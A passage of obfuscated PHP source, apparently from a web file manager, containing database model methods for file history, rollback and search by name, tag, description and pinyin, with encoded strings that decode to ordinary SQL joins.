$¸™²íõ[12], $¸™²íõ[550]); $›•œÇ¸‰ = array_slice($›•œÇ¸‰, $îÁ“ŞÅ); if (!$¬Ñ¶úïÏ || !$›•œÇ¸‰) { return; } $ÙÇíËğ‡ = array($¸™²íõ[502] => array($¸™²íõ[7], $¬Ñ¶úïÏ)); $this->where($ÙÇíËğ‡)->delete(); Model($¸™²íõ[553])->remove($›•œÇ¸‰); } public function listData($¯«şŠ¨³) { $·ÎŠí¾‹ =& $_SERVER[£ğ°ÖØø]; $¤Î–×Õï = array($·ÎŠí¾‹[500] => $¯«şŠ¨³); $Ô¡Ø…üõ = $·ÎŠí¾‹[2208]; $Ìì²Ğ = $this->field($Ô¡Ø…üõ)->where($¤Î–×Õï)->order($·ÎŠí¾‹[2201])->selectPage(); $this->_listAppendUser($Ìì²Ğ[$·ÎŠí¾‹[454]]); $ò¹Ëğó´ = Model($·ÎŠí¾‹[834])->get($·ÎŠí¾‹[1307]); $‹×«¢‰® = 5; if ($ò¹Ëğó´ == $·ÎŠí¾‹[1308]) { $Ìì²Ğ[$·ÎŠí¾‹[454]] = array_slice($Ìì²Ğ[$·ÎŠí¾‹[454]], 0, $‹×«¢‰®); $Ìì²Ğ[$·ÎŠí¾‹[451]] = array($·ÎŠí¾‹[2209] => 1, $·ÎŠí¾‹[2210] => 20, $·ÎŠí¾‹[2211] => 1, $·ÎŠí¾‹[2212] => count($Ìì²Ğ[$·ÎŠí¾‹[454]])); } return $Ìì²Ğ; } protected function _listAppendUser(&$¾ûâ«ôÛ) { $®œÓ¸Ã =& $_SERVER[£ğ°ÖØø]; $ñê—æ›ş = array_to_keyvalue($¾ûâ«ôÛ, $®œÓ¸Ã[12], $®œÓ¸Ã[1755]); $§ê¸›°— = Model($®œÓ¸Ã[607])->userListInfo($ñê—æ›ş); foreach ($¾ûâ«ôÛ as &$‚Êäú–”) { $çãÎö¸„ = $‚Êäú–”[$®œÓ¸Ã[1755]]; $‚Êäú–”[$®œÓ¸Ã[536]] = $§ê¸›°—[$çãÎö¸„] ? $§ê¸›°—[$çãÎö¸„] : !1; } unset($‚Êäú–”); } public function fileInfo($‘Ú¡…ÊÂ) { $àîåĞÜ =& $_SERVER[£ğ°ÖØø]; $½°¿şªÃ = $this->tablePrefix; $ÄÊÅÖäÆ = "{$½°¿şªÃ}\151\157\x5f\146\x69\x6c\145\40\x66\x69\x6c\x65\x73\40\x6f\x6e\40\x66\151\x6c\x65\x73\56\146\x69\x6c\145\x49\x44\40\75\40\x68\x69\163\164\x6f\x72\171\56\146\x69\154\145\111\104"; return $this->alias($àîåĞÜ[2213])->where(array($àîåĞÜ[502] => $‘Ú¡…ÊÂ))->join($ÄÊÅÖäÆ, $àîåĞÜ[2214])->find(); } public function removeItem($èˆç¥Úù) { $¦ù°Ä =& $_SERVER[£ğ°ÖØø]; $šâÉÖî = array($¦ù°Ä[502] => $èˆç¥Úù); $¯ÉÊºŠÕ = $this->where($šâÉÖî)->find(); if ($¯ÉÊºŠÕ) { $ñ¯Úøœá = $this->where($šâÉÖî)->delete(); Model($¦ù°Ä[553])->remove($¯ÉÊºŠÕ[$¦ù°Ä[550]]); return $ñ¯Úøœá; } return !1; } public function removeBySource($´Ş óÅŸ) { $ãŒÙ™‡¤ =& $_SERVER[£ğ°ÖØø]; if (!$´Ş óÅŸ) { return !1; } if (!is_array($´Ş óÅŸ)) { $´Ş óÅŸ = array($´Ş óÅŸ); } $Ûşöª±Å = array($ãŒÙ™‡¤[500] => array($ãŒÙ™‡¤[7], $´Ş óÅŸ)); $æüÈ¹× = $this->field($ãŒÙ™‡¤[551])->where($Ûşöª±Å)->select(); if ($æüÈ¹×) { $this->where($Ûşöª±Å)->delete(); $¡Ú™şîÃ = array_to_keyvalue($æüÈ¹×, $ãŒÙ™‡¤[12], $ãŒÙ™‡¤[550]); Model($ãŒÙ™‡¤[553])->remove($¡Ú™şîÃ); } return !0; } public function setDetail($Üïîåôè, $ŠĞï­«—) { $µ­Äš¯À =& $_SERVER[£ğ°ÖØø]; return $this->where(array($µ­Äš¯À[502] => $Üïîåôè))->save(array($µ­Äš¯À[2204] => $ŠĞï­«—)); } public function rollbackToItem($Ó„Ïû¶Ú, $—Óù™œ¤) { $Ğ¦áô =& $_SERVER[£ğ°ÖØø]; $ßëìèãõ = Model($Ğ¦áô[888])->sourceInfo($Ó„Ïû¶Ú); $this->addHistory($ßëìèãõ, LNG($Ğ¦áô[2215])); $–¨„Øš™ = $this->find($—Óù™œ¤); $´¼²ˆŒ = array($Ğ¦áô[550] => $–¨„Øš™[$Ğ¦áô[550]], $Ğ¦áô[79] => $–¨„Øš™[$Ğ¦áô[79]], $Ğ¦áô[88] => time(), $Ğ¦áô[538] => USER_ID); Model($Ğ¦áô[888])->where(array($Ğ¦áô[193] => $Ó„Ïû¶Ú))->save($´¼²ˆŒ); return $this->where(array($Ğ¦áô[502] => $—Óù™œ¤))->delete(); } public function clearSame($ìÕƒÁ·µ) { $ã¾ÍœÍô =& $_SERVER[£ğ°ÖØø]; $Áå›×‹ƒ = $this->listData($ìÕƒÁ·µ); $–ù¯­ì† = array_to_keyvalue_group($Áå›×‹ƒ, $ã¾ÍœÍô[550]); $åöÂŠ±Ç = array(); $³÷›Çº¹ = array(); foreach ($–ù¯­ì† as $ÇèÄû—õ) { if (!$ÇèÄû—õ || count($ÇèÄû—õ) <= 1) { continue; } foreach ($ÇèÄû—õ as $ÙŞåÔŠ·) { $åöÂŠ±Ç[] = $ÙŞåÔŠ·[$ã¾ÍœÍô[550]]; $³÷›Çº¹[] = $ÙŞåÔŠ·[$ã¾ÍœÍô[484]]; } } if (!$³÷›Çº¹) { return; } $this->where(array($ã¾ÍœÍô[484] => array($ã¾ÍœÍô[7], $³÷›Çº¹)))->delete(); Model($ã¾ÍœÍô[553])->remove($åöÂŠ±Ç); } public function userSpace() { $¡Äœ‰å› =& $_SERVER[£ğ°ÖØø]; $•çä¸¤é = $this->tablePrefix; $ÁĞ„íŒİ = array($¡Äœ‰å›[1746] => USER_ID); $Ìƒò¯©¼ = "{$•çä¸¤é}\151\x6f\137\146\x69\x6c\x65\40\146\x69\154\x65\x73\40\x6f\156\40\x66\x69\154\x65\x73\x2e\x66\x69\x6c\145\x49\104\x20\75\40\150\x69\163\x74\157\x72\x79\x2e\146\151\x6c\145\x49\104"; return $this->alias($¡Äœ‰å›[2213])->where($ÁĞ„íŒİ)->join($Ìƒò¯©¼, $¡Äœ‰å›[2214])->sum($¡Äœ‰å›[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ƒËûÜâÑ) { $êôåŸµ =& $_SERVER[£ğ°ÖØø]; $éù£éÕñ = KodIO::fileTypeList(); $‡éßÍ”¤ = $éù£éÕñ[$ƒËûÜâÑ]; if (!$‡éßÍ”¤) { return array(); } $ê×ƒôæ‘ = $‡éßÍ”¤[$êôåŸµ[169]]; $ÚÀµ×İ¯ = $êôåŸµ[7]; if (!$‡éßÍ”¤[$êôåŸµ[169]]) { $ûşµ×Û– = array_to_keyvalue($éù£éÕñ, $êôåŸµ[12], $êôåŸµ[169]); $ê×ƒôæ‘ = implode($êôåŸµ[50], $ûşµ×Û–); $ÚÀµ×İ¯ = $êôåŸµ[2216]; } $äõÔéï˜ = explode($êôåŸµ[50], trim($ê×ƒôæ‘, $êôåŸµ[50])); return array($ÚÀµ×İ¯, $äõÔéï˜); } public function listPathType($öá›ùŞ) { $°ßôË­ =& $_SERVER[£ğ°ÖØø]; $ùúŒøÖØ = $this->fileTypeWhere($öá›ùŞ); if (!$ùúŒøÖØ) { return array(); } $Æøìµöî = USER_ID; $ŞéŒˆıê = Model($°ßôË­[607])->getInfo($Æøìµöî); $ïµÅèí = array($°ßôË­[657] => SourceModel::TYPE_USER, $°ßôË­[593] => array($°ßôË­[621], $°ßôË­[603] . $ŞéŒˆıê[$°ßôË­[90]][$°ßôË­[193]] . $°ßôË­[622]), $°ßôË­[658] => $Æøìµöî, $°ßôË­[655] => 0, $°ßôË­[656] => $ùúŒøÖØ); return $this->listSource($ïµÅèí); } public function listSearch($™€Øô“, $×Âçç…  = 300) { $ˆïÉ—ÄÎ =& $_SERVER[£ğ°ÖØø]; if (isset($™€Øô“[$ˆïÉ—ÄÎ[2052]]) && $™€Øô“[$ˆïÉ—ÄÎ[2052]]) { $™€Øô“[$ˆïÉ—ÄÎ[2052]] = str_replace($ˆïÉ—ÄÎ[469], $ˆïÉ—ÄÎ[2217], trim($™€Øô“[$ˆïÉ—ÄÎ[2052]])); } $üßú°ç½ = $this->_parseSearchWhere($™€Øô“); if (!isset($üßú°ç½[$ˆïÉ—ÄÎ[514]])) { $üßú°ç½[$ˆïÉ—ÄÎ[514]] = 0; } $¹şæ¶Ë… = $ˆïÉ—ÄÎ[2218]; $ŒŠÃğİå = $üßú°ç½; $²àÃÀ§ = $¹şæ¶Ë…; $this->_listSearchBindPinyin($™€Øô“, $üßú°ç½, $¹şæ¶Ë…); $this->alias($ˆïÉ—ÄÎ[528])->_makeOrder(); $üßú°ç½ = $this->parseWhereLike($üßú°ç½); $ÃáäÒ½Ú = $this->distinct(!0)->field($¹şæ¶Ë…)->where($üßú°ç½)->selectPage($×Âçç… ); if ($GLOBALS[$ˆïÉ—ÄÎ[6]][$ˆïÉ—ÄÎ[466]][$ˆïÉ—ÄÎ[467]] && Input::check($™€Øô“[$ˆïÉ—ÄÎ[2052]], $ˆïÉ—ÄÎ[664]) && $ÃáäÒ½Ú[$ˆïÉ—ÄÎ[451]][$ˆïÉ—ÄÎ[429]] == 1 && $ÃáäÒ½Ú[$ˆïÉ—ÄÎ[451]][$ˆïÉ—ÄÎ[452]] == 0) { $ÃáäÒ½Ú = $this->distinct(!0)->field($¹şæ¶Ë…)->where($ŒŠÃğİå)->limit(1000)->select(); $ÃáäÒ½Ú = array_page_split($ÃáäÒ½Ú, !1, $×Âçç… ); } $this->_listSearchFileContent($ÃáäÒ½Ú, $™€Øô“, $²àÃÀ§, $ŒŠÃğİå); $this->_listSearchDesc($ÃáäÒ½Ú, $™€Øô“, $²àÃÀ§); $this->_listSearchTag($ÃáäÒ½Ú, $™€Øô“, $²àÃÀ§); $this->_listSearchGroupTag($ÃáäÒ½Ú, $™€Øô“, $²àÃÀ§); $this->_listDataApply($ÃáäÒ½Ú[$ˆïÉ—ÄÎ[454]]); $this->_listMake($ÃáäÒ½Ú); return $ÃáäÒ½Ú; } private function _listSearchFileContent(&$ğ¨÷Ë‡Ä, $÷¼´èÉ¬, $“ÅÔ Î, $˜Ú½ô¼) { $—Çä™º© =& $_SERVER[£ğ°ÖØø]; if (!$÷¼´èÉ¬[$—Çä™º©[2052]] || $ğ¨÷Ë‡Ä[$—Çä™º©[451]][$—Çä™º©[429]] > 1) { return; } if (!isset($˜Ú½ô¼[$—Çä™º©[32]]) || !is_array($÷¼´èÉ¬[$—Çä™º©[550]])) { return; } $˜Ú½ô¼[$—Çä™º©[550]] = array($—Çä™º©[7], $÷¼´èÉ¬[$—Çä™º©[550]]); unset($˜Ú½ô¼[$—Çä™º©[32]]); unset($÷¼´èÉ¬[$—Çä™º©[550]]); $ÄË”×ãØ = $this->field($“ÅÔ Î)->where($˜Ú½ô¼)->limit($—Çä™º©[2219])->select(); if (!$ÄË”×ãØ || count($ÄË”×ãØ) == 0) { return; } $ğ¨÷Ë‡Ä[$—Çä™º©[454]] = array_merge($ÄË”×ãØ, $ğ¨÷Ë‡Ä[$—Çä™º©[454]]); $ğ¨÷Ë‡Ä[$—Çä™º©[451]][$—Çä™º©[452]] += count($ÄË”×ãØ); } private function _listSearchTag(&$éØº¬„, $¹ıµŸÛ“, $èÂ„¼Ë) { $€ëÓÜ—¨ =& $_SERVER[£ğ°ÖØø]; if (!$¹ıµŸÛ“[$€ëÓÜ—¨[2052]] || $éØº¬„[$€ëÓÜ—¨[451]][$€ëÓÜ—¨[429]] > 1) { return; } $Ô€®Û–è = Model($€ëÓÜ—¨[2220])->listData(); $ûÄ†–· = array(); $¥é¯ùã = $¹ıµŸÛ“[$€ëÓÜ—¨[2052]]; foreach ($Ô€®Û–è as $Ó—è Šô) { $ş®µŞñ = $Ó—è Šô[$€ëÓÜ—¨[32]]; $ÏœŞú…Ú = str_replace($€ëÓÜ—¨[53], $€ëÓÜ—¨[12], Pinyin::get($ş®µŞñ)); if (stripos($ş®µŞñ, $¥é¯ùã) !== !1 || stripos($ÏœŞú…Ú, $¥é¯ùã) !== !1) { $ûÄ†–·[] = $Ó—è Šô[$€ëÓÜ—¨[484]]; } } if (!$ûÄ†–·) { return; } $şÖöÔÓø = array($€ëÓÜ—¨[509] => array($€ëÓÜ—¨[7], $ûÄ†–·), $€ëÓÜ—¨[1755] => USER_ID); $Îîë‹—ğ = Model($€ëÓÜ—¨[511])->field($€ëÓÜ—¨[87])->where($şÖöÔÓø)->select(); $Îîë‹—ğ = array_to_keyvalue($Îîë‹—ğ, $€ëÓÜ—¨[12], $€ëÓÜ—¨[87]); $™‰ıÁâü = array_unique($Îîë‹—ğ); $this->_listSearchMerge($éØº¬„, $¹ıµŸÛ“, $èÂ„¼Ë, $™‰ıÁâü); } private function _listSearchDesc(&$»éÖÌ½, $ç£‡Ãßç, $ù‹çâô¸) { $ç²ü³± =& $_SERVER[£ğ°ÖØø]; if (!$ç£‡Ãßç[$ç²ü³±[2052]] || $»éÖÌ½[$ç²ü³±[451]][$ç²ü³±[429]] > 1) { return; } $Ì›Ïò“ˆ = array($ç²ü³±[97] => $ç²ü³±[535], $ç²ü³±[459] => array($ç²ü³±[468], $ç²ü³±[2054] . $ç£‡Ãßç[$ç²ü³±[2052]] . $ç²ü³±[2054])); $±Øøä­« = !1; if ($±Øøä­«) { $ÜË§ûÑŒ = $this->listSearchChildren($ç£‡Ãßç[$ç²ü³±[192]]); $ÜË§ûÑŒ = array_unique($ÜË§ûÑŒ); if (!$ÜË§ûÑŒ) { return; } $Ì›Ïò“ˆ[$ç²ü³±[193]] = array($ç²ü³±[7], $ÜË§ûÑŒ); } $™ûâàØÂ = Model($ç²ü³±[641])->field($ç²ü³±[193])->where($Ì›Ïò“ˆ)->limit(5000)->select(); $×˜÷ıÛ® = array_to_keyvalue($™ûâàØÂ, $ç²ü³±[12], $ç²ü³±[193]); $this->_listSearchMerge($»éÖÌ½, $ç£‡Ãßç, $ù‹çâô¸, $×˜÷ıÛ®); } private function _listSearchGroupTag(&$şœšŞä, $¼›ç¬›à, $ ºò‰) { $›î§°¸ =& $_SERVER[£ğ°ÖØø]; if (!$¼›ç¬›à[$›î§°¸[2052]] || $şœšŞä[$›î§°¸[451]][$›î§°¸[429]] > 1 || !$¼›ç¬›à[$›î§°¸[192]]) { return; } $¸Óó­Šë = $this->sourceInfo($¼›ç¬›à[$›î§°¸[192]]); if (!$¸Óó­Šë || $¸Óó­Šë[$›î§°¸[190]] != SourceModel::TYPE_GROUP) { return; } $¢ËÙ’Ä¿ = $¸Óó­Šë[$›î§°¸[578]]; $Œ¾µ÷Ä = Model($›î§°¸[2221])->get($¢ËÙ’Ä¿); $¼ò…à”· = array(); $¨Ò†’êª = $¼›ç¬›à[$›î§°¸[2052]]; foreach ($Œ¾µ÷Ä[$›î§°¸[454]] as $åã“ñ·) { $âóšÒ± = $åã“ñ·[$›î§°¸[32]]; $›îÁÓ¦× = str_replace($›î§°¸[53], $›î§°¸[12], Pinyin::get($âóšÒ±)); if (stripos($âóšÒ±, $¨Ò†’êª) !== !1 || stripos($›îÁÓ¦×, $¨Ò†’êª) !== !1) { $¼ò…à”·[] = $åã“ñ·[$›î§°¸[484]]; } } if (!$¼ò…à”·) { return; } $ª¯œöúÊ = array($›î§°¸[509] => array($›î§°¸[7], $¼ò…à”·), $›î§°¸[1755] => 0, $›î§°¸[33] => $›î§°¸[2074] . $¢ËÙ’Ä¿); $€èÍ¦ù = Model($›î§°¸[511])->field($›î§°¸[87])->where($ª¯œöúÊ)->select(); $€èÍ¦ù = array_to_keyvalue($€èÍ¦ù, $›î§°¸[12], $›î§°¸[87]); $ØÈÚ”ñî = array_unique($€èÍ¦ù); $this->_listSearchMerge($şœšŞä, $¼›ç¬›à, $ ºò‰, $ØÈÚ”ñî); } private function _listSearchMerge(&$Î•Ğ»úÜ, $Ã¾Ÿ—±, $çÔù’øı, $äÖÉÑğ½) { $¹ÛßÂ‚Ç =& $_SERVER[£ğ°ÖØø]; if (!$äÖÉÑğ½) { return; } $üª»ŠÈ± = array_to_keyvalue($Î•Ğ»úÜ[$¹ÛßÂ‚Ç[454]], $¹ÛßÂ‚Ç[12], $¹ÛßÂ‚Ç[193]); $’ ‰„şÄ = array_diff($äÖÉÑğ½, $üª»ŠÈ±); if (!$’ ‰„şÄ) { return; } $ÄçÈİ³ö = array($¹ÛßÂ‚Ç[193] => array($¹ÛßÂ‚Ç[7], $’ ‰„şÄ)); $¡²ïİŒû = $this->field($çÔù’øı)->where($ÄçÈİ³ö)->select(); if (!$¡²ïİŒû) { return; } $Ò±–‡„ô = array(); foreach ($¡²ïİŒû as $İìì¸¥) { if ($this->_listSearchFilter($İìì¸¥, $Ã¾Ÿ—±)) { $Ò±–‡„ô[] = $İìì¸¥; } } $Î•Ğ»úÜ[$¹ÛßÂ‚Ç[454]] = array_merge($Ò±–‡„ô, $Î•Ğ»úÜ[$¹ÛßÂ‚Ç[454]]); $Î•Ğ»úÜ[$¹ÛßÂ‚Ç[451]][$¹ÛßÂ‚Ç[452]] += count($Ò±–‡„ô); } private function _listSearchFilter($Úî‰ó¹•, $ûâŒÌ•) { $Ô®Œ‰« =& $_SERVER[£ğ°ÖØø]; $­›áß©ñ = $Úî‰ó¹•[$Ô®Œ‰«[494]] == $Ô®Œ‰«[91]; if (!strstr($Úî‰ó¹•[$Ô®Œ‰«[593]], $Ô®Œ‰«[50] . $ûâŒÌ•[$Ô®Œ‰«[192]] . $Ô®Œ‰«[50])) { return !1; } if (isset($ûâŒÌ•[$Ô®Œ‰«[495]]) && $ûâŒÌ•[$Ô®Œ‰«[495]] != $Ô®Œ‰«[840]) { if ($ûâŒÌ•[$Ô®Œ‰«[495]] == $Ô®Œ‰«[78] && !$­›áß©ñ) { return !1; } if ($ûâŒÌ•[$Ô®Œ‰«[495]] != $Ô®Œ‰«[78] && $­›áß©ñ) { return !1; } if (!strstr($Úî‰ó¹•[$Ô®Œ‰«[169]], $Ô®Œ‰«[50] . $ûâŒÌ•[$Ô®Œ‰«[495]] . $Ô®Œ‰«[50])) { return !1; } } if (isset($ûâŒÌ•[$Ô®Œ‰«[2222]]) && $ûâŒÌ•[$Ô®Œ‰«[2222]] < $Úî‰ó¹•[$Ô®Œ‰«[79]]) { return !1; } if (isset($ûâŒÌ•[$Ô®Œ‰«[2223]]) && $ûâŒÌ•[$Ô®Œ‰«[2223]] > $Úî‰ó¹•[$Ô®Œ‰«[79]]) { return !1; } if (isset($ûâŒÌ•[$Ô®Œ‰«[671]]) && $ûâŒÌ•[$Ô®Œ‰«[671]] != $Úî‰ó¹•[$Ô®Œ‰«[538]]) { return !1; } return !0; } public function listSearchChildren($ŠÈğ¢ì‹, $ŞĞ“Ú”à = 5000) { $ºù¾Ä˜â =& $_SERVER[£ğ°ÖØø]; $±ê–ú¡ë = array(); $‰¦Ç¤ñë = $this->sourceInfo($ŠÈğ¢ì‹); $Ÿ×°ÈÇ° = array($ºù¾Ä˜â[593] => array($ºù¾Ä˜â[468], $‰¦Ç¤ñë[$ºù¾Ä˜â[593]] . $‰¦Ç¤ñë[$ºù¾Ä˜â[193]] . $ºù¾Ä˜â[622])); $‘ñÈå  = $this->field($ºù¾Ä˜â[79])->where($Ÿ×°ÈÇ°)->limit($ŞĞ“Ú”à + 1)->select(); $æÈÃ¨™ = is_array($‘ñÈå ) ? count($‘ñÈå ) : 0; if ($æÈÃ¨™ > $ŞĞ“Ú”à) { return $this->_listSearchChildrenNear($ŠÈğ¢ì‹, $ŞĞ“Ú”à); } $ù‘½¬•ì = $this->field($ºù¾Ä˜â[193])->where($Ÿ×°ÈÇ°)->select(); $±ê–ú¡ë = array_to_keyvalue($ù‘½¬•ì, $ºù¾Ä˜â[12], $ºù¾Ä˜â[193]); return $±ê–ú¡ë; } private function _listSearchChildrenNear($ÅşŒ”Í, $êú°Ãàœ) { $‚½‹·Î° =& $_SERVER[£ğ°ÖØø]; $ÛÅŒèÇ = array(); $ü×‰“ÄÉ = array($‚½‹·Î°[192] => $ÅşŒ”Í); $¶…š„Ü = $this->field($‚½‹·Î°[2224])->where($ü×‰“ÄÉ)->select(); $Šà£Ÿ¼ò = array_to_keyvalue(array_filter_by_field($¶…š„Ü, $‚½‹·Î°[494], $‚½‹·Î°[91]), $‚½‹·Î°[12], $‚½‹·Î°[193]); $ÛÅŒèÇ = array_merge($ÛÅŒèÇ, array_to_keyvalue($¶…š„Ü, $‚½‹·Î°[12], $‚½‹·Î°[193])); if (!$Šà£Ÿ¼ò) { return $ÛÅŒèÇ; } $ü×‰“ÄÉ = array($‚½‹·Î°[192] => array($‚½‹·Î°[7], $Šà£Ÿ¼ò)); $¶…š„Ü = $this->field($‚½‹·Î°[2224])->where($ü×‰“ÄÉ)->limit($êú°Ãàœ)->select(); $ÛÅŒèÇ = array_merge($ÛÅŒèÇ, array_to_keyvalue($¶…š„Ü, $‚½‹·Î°[12], $‚½‹·Î°[193])); $ÛÅŒèÇ = array_slice($ÛÅŒèÇ, 0, intval($êú°Ãàœ)); return $ÛÅŒèÇ; } private function _listSearchBindPinyin($ˆ›äöùÜ, &$„¿Ğ¦â, &$¦İÇó‹¨) { $ŠŒ‹¶ò =& $_SERVER[£ğ°ÖØø]; if (!isset($ˆ›äöùÜ[$ŠŒ‹¶ò[2052]]) || !$ˆ›äöùÜ[$ŠŒ‹¶ò[2052]]) { return; } if (!Input::check($ˆ›äöùÜ[$ŠŒ‹¶ò[2052]], $ŠŒ‹¶ò[394]) || strlen($ˆ›äöùÜ[$ŠŒ‹¶ò[2052]]) < 2) { return; } $¦ş„§“ = "\x4c\105\106\124\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\137\163\157\x75\162\143\x65\137\155\145\x74\141\x20\x6d\x65\164\x61\x20\157\x6e\x20\163\157\165\162\x63\x65\56\163\157\165\162\x63\145\111\104\40\x3d\x20\x6d\145\x74\x61\56\163\x6f\x75\162\x63\x65\x49\104"; $Ì»©•°ƒ = array(); $¦İÇó‹¨ = str_replace(array($ŠŒ‹¶ò[262], $ŠŒ‹¶ò[53], $ŠŒ‹¶ò[2225]), $ŠŒ‹¶ò[12], $¦İÇó‹¨); $¦İÇó‹¨ = $ŠŒ‹¶ò[520] . str_replace($ŠŒ‹¶ò[50], $ŠŒ‹¶ò[521], $¦İÇó‹¨); $ªåÁ‚Á = $„¿Ğ¦â[$ŠŒ‹¶ò[32]]; unset($„¿Ğ¦â[$ŠŒ‹¶ò[32]]); foreach ($„¿Ğ¦â as $œ£Õ­œÍ => $ûßş¬Ÿ) { $Ì»©•°ƒ[$ŠŒ‹¶ò[520] . $œ£Õ­œÍ] = $ûßş¬Ÿ; } foreach ($ªåÁ‚Á as $©İÓ£ìø) { $Ì»©•°ƒ[] = array($ŠŒ‹¶ò[525] => $©İÓ£ìø, $ŠŒ‹¶ò[1061] => $ŠŒ‹¶ò[2056], array($ŠŒ‹¶ò[2226] => $©İÓ£ìø, $ŠŒ‹¶ò[2227] => array($ŠŒ‹¶ò[7], array($ŠŒ‹¶ò[547], $ŠŒ‹¶ò[546])))); } $this->join($¦ş„§“); $„¿Ğ¦â = $Ì»©•°ƒ; } private function _parseSearchWhere($æ¥ğ–º) { $†¬­¬ =& $_SERVER[£ğ°ÖØø]; $ŞàÉ¤¡à = array(); if (isset($æ¥ğ–º[$†¬­¬[824]]) && $æ¥ğ–º[$†¬­¬[824]]) { $ŞàÉ¤¡à[$†¬­¬[88]] = array($†¬­¬[2228], $æ¥ğ–º[$†¬­¬[824]]); } if (isset($æ¥ğ–º[$†¬­¬[825]]) && $æ¥ğ–º[$†¬­¬[825]]) { $¬î’ÊûŸ = array($†¬­¬[2229], $æ¥ğ–º[$†¬­¬[825]]); if ($ŞàÉ¤¡à[$†¬­¬[88]]) { $ŞàÉ¤¡à[$†¬­¬[88]] = array($ŞàÉ¤¡à[$†¬­¬[88]], $¬î’ÊûŸ, $†¬­¬[2230]); } else { $ŞàÉ¤¡à[$†¬­¬[88]] = $¬î’ÊûŸ; } } if (isset($æ¥ğ–º[$†¬­¬[2222]]) && $æ¥ğ–º[$†¬­¬[2222]] > 0) { $ŞàÉ¤¡à[$†¬­¬[79]] = array($†¬­¬[2228], $æ¥ğ–º[$†¬­¬[2222]]); } if (isset($æ¥ğ–º[$†¬­¬[2223]]) && $æ¥ğ–º[$†¬­¬[2223]]) { $¬î’ÊûŸ = array($†¬­¬[2229], $æ¥ğ–º[$†¬­¬[2223]]); if ($ŞàÉ¤¡à[$†¬­¬[79]]) { $ŞàÉ¤¡à[$†¬­¬[79]] = array($ŞàÉ¤¡à[$†¬­¬[79]], $¬î’ÊûŸ, $†¬­¬[2230]); } else { $ŞàÉ¤¡à[$†¬­¬[79]] = $¬î’ÊûŸ; } } if (isset($æ¥ğ–º[$†¬­¬[671]]) && $æ¥ğ–º[$†¬­¬[671]]) { $ŞàÉ¤¡à[] = array($†¬­¬[538] => $æ¥ğ–º[$†¬­¬[671]], $†¬­¬[536] => $æ¥ğ–º[$†¬­¬[671]], $†¬­¬[1061] => $†¬­¬[2056]); } if (isset($æ¥ğ–º[$†¬­¬[495]]) && $æ¥ğ–º[$†¬­¬[495]]) { $¬Ã¤£·Ú = $æ¥ğ–º[$†¬­¬[495]]; if ($¬Ã¤£·Ú == $†¬­¬[78]) { $ŞàÉ¤¡à[$†¬­¬[494]] = 1; } else { if ($¬Ã¤£·Ú == $†¬­¬[2231]) { $ŞàÉ¤¡à[$†¬­¬[494]] = 0; } else { if ($¬Ã¤£·Ú) { $¬Ã¤£·Ú = is_array($¬Ã¤£·Ú) ? $¬Ã¤£·Ú : explode($†¬­¬[50], $¬Ã¤£·Ú); $ŞàÉ¤¡à[$†¬­¬[495]] = array($†¬­¬[501], $¬Ã¤£·Ú); $ŞàÉ¤¡à[$†¬­¬[494]] = 0; } } } } $this->_parseSearchParent($æ¥ğ–º, $ŞàÉ¤¡à); if (isset($æ¥ğ–º[$†¬­¬[2052]]) && trim($æ¥ğ–º[$†¬­¬[2052]])) { $÷ÒæÜ÷ = trim($æ¥ğ–º[$†¬­¬[2052]]); $œàÌŞ¼– = explode($†¬­¬[53], $÷ÒæÜ÷); if (strlen($÷ÒæÜ÷) > 2 && (substr($÷ÒæÜ÷, 0, 1) == $†¬­¬[121] && substr($÷ÒæÜ÷, -1) == $†¬­¬[121]) || substr($÷ÒæÜ÷, 0, 1) == $†¬­¬[58] && substr($÷ÒæÜ÷, -1) == $†¬­¬[58]) { $÷ÒæÜ÷ = substr($÷ÒæÜ÷, 1, -1); $œàÌŞ¼– = array($÷ÒæÜ÷); } $ŞàÉ¤¡à[$†¬­¬[32]] = array(array($†¬­¬[621], $†¬­¬[2054] . $÷ÒæÜ÷ . $†¬­¬[2054])); if (count($œàÌŞ¼–) > 1) { $ŞàÉ¤¡à[$†¬­¬[32]] = array(); foreach ($œàÌŞ¼– as $‡ÎñÜàˆ) { if (!trim($‡ÎñÜàˆ)) { continue; } $ŞàÉ¤¡à[$†¬­¬[32]][] = array($†¬­¬[621], $†¬­¬[2054] . trim($‡ÎñÜàˆ) . $†¬­¬[2054]); } } } return $ŞàÉ¤¡à; } private function _parseSearchParent($Á·ÕÔ²Ê, &$¼ÔìõƒÏ) { $áÑîı¨£ =& $_SERVER[£ğ°ÖØø]; if (!isset($Á·ÕÔ²Ê[$áÑîı¨£[192]]) || !$Á·ÕÔ²Ê[$áÑîı¨£[192]]) { return; } $‡ôşàÁ› = $this->pathInfo($Á·ÕÔ²Ê[$áÑîı¨£[192]]); $ô½Ä¤Í” = $‡ôşàÁ›[$áÑîı¨£[192]] . $áÑîı¨£[12] === $áÑîı¨£[228]; $…¸ËÔòÓ = $‡ôşàÁ›[$áÑîı¨£[190]] == $áÑîı¨£[587]; if ($‡ôşàÁ›[$áÑîı¨£[604]] == $áÑîı¨£[605]) { $€Ç¾‰ = $this->sourceInfo($Á·ÕÔ²Ê[$áÑîı¨£[192]]); $‡ôşàÁ›[$áÑîı¨£[593]] = $€Ç¾‰[$áÑîı¨£[593]]; } $¼ÔìõƒÏ[$áÑîı¨£[661]] = array($áÑîı¨£[621], $‡ôşàÁ›[$áÑîı¨£[593]] . $Á·ÕÔ²Ê[$áÑîı¨£[192]] . $áÑîı¨£[622]); $«Ò¶¥Ä¶ = isset($Á·ÕÔ²Ê[$áÑîı¨£[1912]]) && in_array($áÑîı¨£[587], $Á·ÕÔ²Ê[$áÑîı¨£[1912]]); if (!$«Ò¶¥Ä¶ || !$…¸ËÔòÓ || !$ô½Ä¤Í” || !$‡ôşàÁ›[$áÑîı¨£[496]]) { return; } if (!AuthModel::authCheckRoot($‡ôşàÁ›[$áÑîı¨£[496]][$áÑîı¨£[497]])) { return; } $›ã³Û… = $‡ôşàÁ›[$áÑîı¨£[578]] . $áÑîı¨£[12]; if ($›ã³Û… == $áÑîı¨£[91]) { unset($¼ÔìõƒÏ[$áÑîı¨£[661]]); $¼ÔìõƒÏ[$áÑîı¨£[190]] = self::TYPE_GROUP; return; } $µ¨¯ªª¨ = Model($áÑîı¨£[594])->groupChildrenAll($›ã³Û…); $üæ«ç = count($µ¨¯ªª¨); if ($üæ«ç <= 1) { return; } $úîè€ôÛ = array($áÑîı¨£[192] => 0, $áÑîı¨£[190] => self::TYPE_GROUP, $áÑîı¨£[578] => array($áÑîı¨£[7], 